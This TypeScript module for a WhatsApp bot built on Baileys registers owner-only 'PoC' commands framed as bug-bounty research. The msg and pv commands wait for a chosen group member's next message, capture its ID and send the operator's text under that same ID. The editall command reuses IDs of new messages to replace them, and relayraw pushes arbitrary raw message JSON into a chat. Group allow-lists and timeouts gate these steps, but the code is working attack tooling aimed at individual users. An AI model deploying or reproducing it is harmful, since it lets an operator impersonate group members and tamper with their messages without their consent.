import type { WAMessage, WASocket } from 'baileys'
import type { BotCommand, CommandContext } from '../types.js'
import { resolveStoredIdentity } from '../services/identity.js'
import {
  addPocChat,
  clearPocChats,
  disableEditAllPoc,
  enableEditAllPoc,
  getEditAllPocStatus,
  isPocChatAllowed,
  listPocChats,
  removePocChat,
  executeMessageIdCollisionPoc,
} from '../services/security-poc-scope.js'
import { digitsFromJid, getContextInfo, unwrapMessage } from '../utils/message.js'
import { resolveTarget } from '../utils/target.js'

const LISTENER_TTL_MS = 90_000
const MAX_POC_TEXT = 2000
const activeListeners = new Map<string, {
  socket: CommandContext['socket']
  listener: (update: any) => void
  timer: NodeJS.Timeout
}>()

function instanceLabel(ctx: CommandContext) {
  return ctx.instanceId ? `subbot:${ctx.instanceId}` : 'main'
}

function normalizedIdentity(value?: string | null) {
  const raw = String(value ?? '').replace(/:\d+@/, '@')
  const resolved = resolveStoredIdentity(raw) || raw
  return [raw, resolved]
}

function sameIdentity(left?: string | null, right?: string | null) {
  const a = normalizedIdentity(left)
  const b = normalizedIdentity(right)
  if (a.some((value) => value && b.includes(value))) return true
  const ad = new Set(a.map(digitsFromJid).filter(Boolean))
  return b.some((value) => {
    const digits = digitsFromJid(value)
    return Boolean(digits && ad.has(digits))
  })
}

function participantJid(participant: { id?: string | null; phoneNumber?: string | null; lid?: string | null }) {
  return participant.phoneNumber || participant.id || participant.lid || ''
}

function currentOrExplicitGroup(ctx: CommandContext, value?: string) {
  const explicit = String(value ?? '').trim()
  if (explicit) return explicit
  if (ctx.isGroup) return ctx.chatId
  throw new Error('Indica el JID del grupo o ejecuta el comando dentro del grupo.')
}

async function assertInstanceParticipates(ctx: CommandContext, groupJid: string) {
  if (!/^\d+@g\.us$/i.test(groupJid)) throw new Error('JID de grupo inválido. Debe terminar en @g.us.')
  const groups = await ctx.socket.groupFetchAllParticipating()
  if (!Object.prototype.hasOwnProperty.call(groups, groupJid)) {
    throw new Error('Esta instancia del bot no pertenece a ese grupo.')
  }
  return ctx.socket.groupMetadata(groupJid)
}

function requirePocGroup(groupJid: string) {
  if (!isPocChatAllowed(groupJid)) {
    throw new Error('Ese grupo no está habilitado para pruebas PoC. Usa .pocgroup add primero.')
  }
}

function requirePrivate(ctx: CommandContext) {
  if (ctx.isGroup) throw new Error('Este comando se ejecuta desde el privado autorizado del owner/staff.')
}

function quotedText(ctx: CommandContext) {
  const content = unwrapMessage(getContextInfo(ctx.message)?.quotedMessage)
  if (!content) return ''
  return String(
    content.conversation
      ?? content.extendedTextMessage?.text
      ?? content.imageMessage?.caption
      ?? content.videoMessage?.caption
      ?? content.documentMessage?.caption
      ?? '',
  ).trim()
}

function extractTextAfterTarget(ctx: CommandContext) {
  const mentioned = getContextInfo(ctx.message)?.mentionedJid?.length
  if (mentioned) return ctx.argText.replace(/^@\S+\s*/u, '').trim()
  if (getContextInfo(ctx.message)?.participant) return ctx.argText.trim()
  return ctx.args.slice(1).join(' ').trim()
}

function clearActiveListener(key: string) {
  const active = activeListeners.get(key)
  if (!active) return false
  clearTimeout(active.timer)
  active.socket.ev.off('messages.upsert', active.listener)
  activeListeners.delete(key)
  return true
}

function messageSender(message: WAMessage) {
  const key = message.key as typeof message.key & { participantAlt?: string | null }
  return key.participantAlt || key.participant || key.remoteJid || ''
}

async function armMessageIdCollision(input: {
  ctx: CommandContext
  groupJid: string
  targetJid: string
  text: string
  notifyJid: string
}) {
  const { ctx, groupJid, targetJid, text, notifyJid } = input
  requirePocGroup(groupJid)
  if (!text.trim()) throw new Error('Debes indicar el texto de la PoC.')
  if (text.length > MAX_POC_TEXT) throw new Error(`El texto está limitado a ${MAX_POC_TEXT} caracteres.`)

  const key = `${instanceLabel(ctx)}|${groupJid}|${targetJid}`
  clearActiveListener(key)

  const listener = (update: any) => {
    if (update?.type !== 'notify' || !Array.isArray(update?.messages)) return
    for (const incoming of update.messages as WAMessage[]) {
      if (!incoming?.key || incoming.key.remoteJid !== groupJid || incoming.key.fromMe) continue
      const sender = messageSender(incoming)
      if (!sameIdentity(sender, targetJid)) continue
      const capturedId = incoming.key.id
      if (!capturedId) continue

      clearActiveListener(key)
      void (async () => {
        try {
          await executeMessageIdCollisionPoc(
            ctx.socket as unknown as WASocket,
            groupJid,
            capturedId,
            text,
          )
          await ctx.socket.sendMessage(notifyJid, {
            text: `PoC invisible ejecutada. ID capturado: \`${capturedId}\``,
          }).catch(() => undefined)
        } catch (error) {
          const message = error instanceof Error ? error.message : String(error)
          await ctx.socket.sendMessage(notifyJid, { text: `Error en PoC invisible: ${message}` }).catch(() => undefined)
        }
      })()
      break
    }
  }

  const timer = setTimeout(() => {
    if (!clearActiveListener(key)) return
    void ctx.socket.sendMessage(notifyJid, {
      text: 'La espera de la PoC invisible expiró sin capturar un mensaje del objetivo.',
    }).catch(() => undefined)
  }, LISTENER_TTL_MS)

  activeListeners.set(key, { socket: ctx.socket, listener, timer })
  ctx.socket.ev.on('messages.upsert', listener)
}

async function pocGroupCommand(ctx: CommandContext) {
  const action = (ctx.args[0] ?? 'status').toLowerCase()

  if (action === 'add' || action === 'añadir' || action === 'agregar') {
    const groupJid = currentOrExplicitGroup(ctx, ctx.args[1])
    const metadata = await assertInstanceParticipates(ctx, groupJid)
    addPocChat(groupJid, metadata.subject || groupJid, ctx.sender)
    await ctx.reply([
      '*GRUPO PoC AUTORIZADO*',
      `Grupo: *${metadata.subject || groupJid}*`,
      `JID: \`${groupJid}\``,
      '',
      'Las funciones edit/invisible/editall/relayraw quedan habilitadas únicamente dentro de este alcance.',
    ].join('\n'))
    return
  }

  if (action === 'remove' || action === 'del' || action === 'quitar' || action === 'borrar') {
    const groupJid = currentOrExplicitGroup(ctx, ctx.args[1])
    cancelValleyPocListenersForChat(groupJid)
    const removed = removePocChat(groupJid)
    await ctx.reply(removed ? `Grupo PoC eliminado: \`${groupJid}\`` : 'Ese grupo no estaba registrado como PoC.')
    return
  }

  if (action === 'list' || action === 'lista') {
    const rows = listPocChats()
    if (!rows.length) {
      await ctx.reply('No hay grupos autorizados para pruebas PoC en esta instancia.')
      return
    }
    const lines = ['*GRUPOS PoC AUTORIZADOS*', `Instancia: *${instanceLabel(ctx)}*`, '']
    for (const row of rows) {
      lines.push(`• *${row.label || 'Sin nombre'}*`, `  \`${row.chatId}\``)
    }
    await ctx.reply(lines.join('\n'))
    return
  }

  if (action === 'clear' || action === 'limpiar') {
    if (!ctx.isOwner) throw new Error('Solo el owner principal puede limpiar todos los grupos PoC de una vez.')
    if ((ctx.args[1] ?? '').toLowerCase() !== 'confirm') {
      throw new Error(`Confirma con ${ctx.prefix}pocgroup clear confirm`)
    }
    for (const row of listPocChats()) cancelValleyPocListenersForChat(row.chatId)
    const removed = clearPocChats()
    await ctx.reply(`Alcance PoC limpiado. Grupos eliminados: *${removed}*.`)
    return
  }

  if (action === 'status' || action === 'estado') {
    const groupJid = currentOrExplicitGroup(ctx, ctx.args[1])
    await ctx.reply(`PoC para \`${groupJid}\`: *${isPocChatAllowed(groupJid) ? 'AUTORIZADA' : 'DESACTIVADA'}*`)
    return
  }

  throw new Error([
    `Uso: ${ctx.prefix}pocgroup add [grupo@g.us]`,
    `${ctx.prefix}pocgroup remove [grupo@g.us]`,
    `${ctx.prefix}pocgroup list`,
    `${ctx.prefix}pocgroup status [grupo@g.us]`,
  ].join('\n'))
}

async function invisibleCommand(ctx: CommandContext) {
  requirePocGroup(ctx.chatId)
  const target = await resolveTarget(ctx, {
    requiredMessage: `Menciona o responde al objetivo: ${ctx.prefix}msg @usuario texto`,
  })
  if (!target) throw new Error('No pude resolver el objetivo.')
  const text = extractTextAfterTarget(ctx)
  if (!text) throw new Error(`Uso: ${ctx.prefix}msg @usuario <texto>`)

  await armMessageIdCollision({
    ctx,
    groupJid: ctx.chatId,
    targetJid: target,
    text,
    notifyJid: ctx.chatId,
  })
  await ctx.reply('PoC invisible armada durante 90 s para el siguiente mensaje del objetivo en este grupo.')
}

async function pvCommand(ctx: CommandContext) {
  requirePrivate(ctx)
  const [groupPart = '', targetPart = '', ...textParts] = ctx.argText.split('|').map((value) => value.trim())
  if (!groupPart || !targetPart) {
    throw new Error(`Uso: ${ctx.prefix}pv <grupo@g.us> | <número/JID> | <texto>`)
  }
  requirePocGroup(groupPart)
  const metadata = await assertInstanceParticipates(ctx, groupPart)
  const targetDigits = targetPart.replace(/\D/g, '')
  const target = metadata.participants
    .map((participant) => participantJid(participant))
    .find((jid) => sameIdentity(jid, targetPart) || Boolean(targetDigits && digitsFromJid(jid) === targetDigits))
  if (!target) throw new Error('El objetivo no pertenece al grupo seleccionado o no pude resolver su PN/LID.')
  const text = textParts.join(' | ').trim()
  if (!text) throw new Error('Debes indicar el texto de la PoC.')

  await armMessageIdCollision({
    ctx,
    groupJid: groupPart,
    targetJid: target,
    text,
    notifyJid: ctx.chatId,
  })
  await ctx.reply(`PoC PV armada durante 90 s para *${metadata.subject || groupPart}*.`)
}

async function editAllCommand(ctx: CommandContext) {
  requirePocGroup(ctx.chatId)
  const action = (ctx.args[0] ?? 'info').toLowerCase()

  if (action === 'on' || action === 'activar') {
    const replacement = ctx.args.slice(1).join(' ').trim()
    const status = enableEditAllPoc(ctx.chatId, replacement, ctx.sender)
    await ctx.reply([
      '*EDITALL PoC ACTIVADO*',
      `Máximo: *${status.remaining} mensajes*`,
      'Expira automáticamente en: *10 minutos*',
      `Texto: ${status.replacementText}`,
      '',
      'El watcher está ligado al socket de esta instancia y se recupera automáticamente tras una reconexión.',
      `Desactiva antes con ${ctx.prefix}editall off si ya terminaste la prueba.`,
    ].join('\n'))
    return
  }

  if (action === 'off' || action === 'desactivar') {
    disableEditAllPoc(ctx.chatId, ctx.sender)
    await ctx.reply('EditAll PoC desactivado.')
    return
  }

  if (action === 'info' || action === 'status' || action === 'estado') {
    const status = getEditAllPocStatus(ctx.chatId)
    await ctx.reply(status.enabled
      ? `EditAll PoC: *ACTIVO* · restantes: *${status.remaining}* · expira: ${new Date(status.expiresAt).toISOString()}`
      : 'EditAll PoC: *DESACTIVADO*.')
    return
  }

  throw new Error(`Uso: ${ctx.prefix}editall on [texto] | off | info`)
}

async function relayRawCommand(ctx: CommandContext) {
  requirePocGroup(ctx.chatId)
  const raw = (ctx.argText.trim() || quotedText(ctx)).trim()
  if (!raw) throw new Error(`Uso: ${ctx.prefix}relayraw <JSON> o responde a un mensaje que contenga JSON.`)
  if (Buffer.byteLength(raw, 'utf8') > 32 * 1024) throw new Error('El payload JSON supera 32 KiB.')

  let payload: unknown
  try {
    payload = JSON.parse(raw)
  } catch {
    throw new Error('JSON inválido.')
  }
  if (!payload || typeof payload !== 'object' || Array.isArray(payload)) throw new Error('El payload debe ser un objeto JSON de mensaje.')

  const topLevel = Object.keys(payload as Record<string, unknown>)
  const forbidden = new Set([
    'protocolMessage',
    'senderKeyDistributionMessage',
    'deviceSentMessage',
    'pollUpdateMessage',
    'call',
  ])
  if (topLevel.some((key) => forbidden.has(key))) {
    throw new Error('Ese tipo de payload de control no está permitido por relayraw.')
  }

  await ctx.socket.relayMessage(ctx.chatId, payload as any, {})
}

export function cancelValleyPocListenersForChat(chatId: string) {
  let count = 0
  for (const key of [...activeListeners.keys()]) {
    if (!key.includes(`|${chatId}|`)) continue
    if (clearActiveListener(key)) count += 1
  }
  return count
}

export const valleyPocV22Commands: BotCommand[] = [
  {
    name: 'pocgroup', aliases: ['testgroup', 'bugbountygroup', 'pocscope'], category: 'owner', staffOnly: true,
    description: 'Administra los grupos autorizados para las PoC de investigación.', usage: 'pocgroup add|remove|list|status', handler: pocGroupCommand,
  },
  {
    name: 'editall', aliases: ['valleyeditall'], category: 'owner', staffOnly: true, groupOnly: true,
    description: 'PoC acotada de EditAll: reutiliza IDs de mensajes nuevos dentro de un grupo de pruebas.', usage: 'editall on [texto] | off | info', handler: editAllCommand,
  },
  {
    name: 'msg', aliases: ['invisible', 'valleymsg'], category: 'owner', staffOnly: true, groupOnly: true,
    description: 'PoC de ValleyInvisible: espera el siguiente mensaje del objetivo y prueba colisión de messageId.', usage: 'msg @usuario <texto>', handler: invisibleCommand,
  },
  {
    name: 'pv', aliases: ['invisiblepv', 'valleypv'], category: 'owner', staffOnly: true,
    description: 'Arma por privado la PoC invisible contra un objetivo de un grupo de pruebas autorizado.', usage: 'pv <grupo@g.us> | <número/JID> | <texto>', handler: pvCommand,
  },
  {
    name: 'relayraw', aliases: ['relayjson', 'valleyrelay'], category: 'owner', staffOnly: true, groupOnly: true,
    description: 'Relay JSON de investigación limitado a un grupo PoC y sin mensajes de control destructivos.', usage: 'relayraw <JSON>', handler: relayRawCommand,
  },
]
